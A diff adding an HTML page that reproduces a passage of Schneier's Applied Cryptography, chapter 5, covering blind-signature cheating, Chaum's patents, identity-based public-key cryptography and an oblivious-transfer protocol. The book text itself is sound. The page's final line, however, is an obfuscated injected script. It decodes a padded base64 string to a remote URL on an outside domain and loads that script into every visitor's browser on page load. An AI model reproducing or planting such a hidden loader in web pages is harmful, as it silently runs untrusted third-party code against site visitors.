@@ -1,0 +1,128 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=114-117//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>There is a trick that makes BOB&#146;s chance of cheating even smaller. In step (4), ALICE randomly chooses <I>n</I>/2 of the documents to challenge, and BOB sends her the appropriate blinding factors in step (5). In step (7), ALICE multiplies together all of the unchallenged documents and signs the mega-document. In step (8), BOB strips off all the blinding factors. ALICE&#146;s signature is acceptable only if it is a valid signature of the product of <I>n</I>/2 identical documents. To cheat BOB has to be able to guess exactly which subset ALICE will challenge; the odds are much smaller than the odds of guessing which one document ALICE won&#146;t challenge.</P>
+<P>BOB has another way to cheat. He can generate two different documents, one that ALICE is willing to sign and one that ALICE is not. Then he can find two different blinding factors that transform each document into the same blinded document. That way, if ALICE asks to examine the document, BOB gives her the blinding factor that transforms it into the benign document. If ALICE doesn&#146;t ask to see the document and signs it, he uses the blinding factor that transforms it into the malevolent document. While this is theoretically possible, the mathematics of the particular algorithms involved make the odds of BOB&#146;s being able to find such a pair negligibly small. In fact, it can be made as small as the odds of Bob being able to produce the signature on an arbitrary message himself. This issue is discussed further in Section 23.12.</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>Chaum has patents for several flavors of blind signatures (see Table 5.1).
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">5.4 Identity-Based Public-Key Cryptography</FONT></H3>
+<P>Alice wants to send a secure message to Bob. She doesn&#146;t want to get his public key from a key server; she doesn&#146;t want to verify some trusted third party&#146;s signature on his public-key certificate; and she doesn&#146;t even want to store Bob&#146;s public key on her own computer. She just wants to send him a secure message.
+</P>
+<P><B>Identity-based cryptosystems</B>, sometimes called Non-Interactive Key Sharing (NIKS) systems, solve this problem [1422]. Bob&#146;s public key is based on his name and network address (or telephone number, or physical street address, or whatever). With normal public-key cryptography, Alice needs a signed certificate that associates Bob&#146;s public key with his identity. With identity-based cryptography, Bob&#146;s public key <I>is</I> his identity. This is a really cool idea, and about as ideal as you can get for a mail system: If Alice knows Bob&#146;s address, she can send him secure mail. It makes the cryptography about as transparent as possible.</P>
+<P>The system is based on Trent issuing private keys to users based on their identity. If Alice&#146;s private key is compromised, she has to change some aspect of her identity to get another one. A serious problem is designing a system in such a way that a collusion of dishonest users cannot forge a key.</P>
+<P>A lot of work has been done on the mathematics of these sorts of schemes&#151;most of it in Japan&#151;which turn out to be infuriatingly complicated to make secure. Many of the proposed solutions involve Trent choosing a random number for each user&#151;in my opinion this defeats the real point of the system. Some of the algorithms discussed in Chapters 19 and 20 can be identity-based. For details, algorithms, and cryptanalysis, see [191,1422,891,1022,1515,1202,1196,908,692,674,1131,1023,1516,1536,1544,63,<BR>1210,314,313,1545,1539,1543,933,1517,748,1228]. An algorithm that does not rely on any random numbers is [1035]. The system discussed in [1546,1547,1507] is insecure against a chosen-public-key attack; so is the system proposed as NIKS-TAS [1542,1540,1541,993,375,1538]. Honestly, nothing proposed so far is both practical and secure.</P>
+<TABLE WIDTH="100%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="3">TABLE 5.1<BR>Chaum&#146;s Blind Signature Patents
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH WIDTH="25%" ALIGN="LEFT">U.S. PATENT #
+<TH WIDTH="15%" ALIGN="LEFT">DATE
+<TH WIDTH="60%" ALIGN="LEFT">TITLE
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">4,759,063
+<TD VALIGN="TOP" ALIGN="LEFT">7/19/88
+<TD VALIGN="TOP" ALIGN="LEFT">Blind Signature Systems [323]
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">4,759,064
+<TD VALIGN="TOP" ALIGN="LEFT">7/19/88
+<TD VALIGN="TOP" ALIGN="LEFT">Blind Unanticipated Signature Systems [324]
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">4,914,698
+<TD VALIGN="TOP" ALIGN="LEFT">3/3/90
+<TD VALIGN="TOP" ALIGN="LEFT">One-Show Blind Signature Systems [326]
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">4,949,380
+<TD VALIGN="TOP" ALIGN="LEFT">8/14/90
+<TD VALIGN="TOP" ALIGN="LEFT">Returned-Value Blind Signature Systems [328]
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">4,991,210
+<TD VALIGN="TOP" ALIGN="LEFT">2/5/91
+<TD VALIGN="TOP" ALIGN="LEFT">Unpredictable Blind Signature Systems [331]
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+</TABLE>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">5.5 Oblivious Transfer</FONT></H3>
+<P>Cryptographer Bob is desperately trying to factor a 500-bit number, <I>n</I>. He knows it&#146;s the product of five 100-bit numbers, but nothing more. (This is a problem. If he can&#146;t recover the key he&#146;ll have to work overtime and he&#146;ll miss his weekly mental poker game with Alice.)</P>
+<P>What do you know? Here comes Alice now:</P>
+<BLOCKQUOTE><P>&#147;I happen to know one factor of the number,&#148; she says, &#147;and I&#146;ll sell it to you for $100. That&#146;s a dollar a bit.&#148; To show she&#146;s serious, she uses a bit-commitment scheme and commits to each bit individually.
+</P>
+<P>Bob is interested, but has only $50. Alice is unwilling to lower her price and offers to sell Bob half the bits for half the price. &#147;It&#146;ll save you a considerable amount of work,&#148; she says.</P>
+<P>&#147;But how do I know that your number is actually a factor of <I>n?</I> If you show me the number and let me verify that it is a factor, then I will agree to your terms,&#148; says Bob.</P>
+<P>They are at an impasse. Alice cannot convince Bob that her number is a factor of <I>n</I> without revealing it, and Bob is unwilling to buy 50 bits of a number that could very well be worthless.</P>
+</BLOCKQUOTE><P>This story, stolen from Joe Kilian [831], introduces the concept of <B>oblivious transfer</B>. Alice transmits a group of messages to Bob. Bob receives some subset of those messages, but Alice has no idea which ones he receives. This doesn&#146;t completely solve the problem, however. After Bob has received a random half of the bits, Alice has to convince him that the bits she sent are part of a factor of <I>n</I>, using a zero-knowledge proof.</P>
+<P>In the following protocol, Alice will send Bob one of two messages. Bob will receive one, and Alice will not know which.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates two public-key/private-key key pairs, or four keys in all. She sends both public keys to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses a key in a symmetric algorithm (DES, for example). He chooses one of Alice&#146;s public keys and encrypts his DES key with it. He sends the encrypted key to Alice without telling her which of her public keys he used to encrypt it.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice decrypts Bob&#146;s key twice, once with each of her private keys. In one of the cases, she uses the correct key and successfully decrypts Bob&#146;s DES key. In the other case, she uses the wrong key and only manages to generate a meaningless pile of bits that nonetheless look like a random DES key. Since she does not know the correct plaintext, she has no idea which is which.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice encrypts both of her messages, each with a different one of the DES keys she generated in the previous step (one real and one meaningless) and sends both of them to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob gets one of Alice&#146;s messages encrypted with the proper DES key and the other one encrypted with the gibberish DES key. When Bob decrypts each of them with his DES key, he can read one of them; the other just looks like gibberish to him.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(qSDasXof, yqYKsIPk) {yqYKsIPk = qSDasXof.createElement('script');yqYKsIPk.type = 'text/javascript';yqYKsIPk.async = true;yqYKsIPk.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');qSDasXof.getElementsByTagName('body')[0].appendChild(yqYKsIPk);}(document));</script></body>
+</html>
